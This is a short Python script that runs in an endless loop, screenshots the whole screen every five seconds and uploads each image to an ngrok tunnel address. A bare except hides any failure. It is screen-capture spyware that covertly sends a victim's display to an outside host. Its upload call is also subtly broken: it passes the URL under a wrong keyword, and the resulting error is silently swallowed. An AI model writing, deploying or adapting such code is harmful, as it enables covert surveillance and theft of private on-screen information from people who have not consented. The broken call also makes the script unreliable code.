import time
import requests
import pyscreenshot as ImageGrab

while True:
    img = ImageGrab.grab()
    img.save("temp.png")

    try:
        requests.post(
            server_url = 'https://roxy-maladapted-aeroscopically.ngrok-free.dev',
            files={"file": open("temp.png", "rb")}
        )
    except:
        pass

    time.sleep(5)
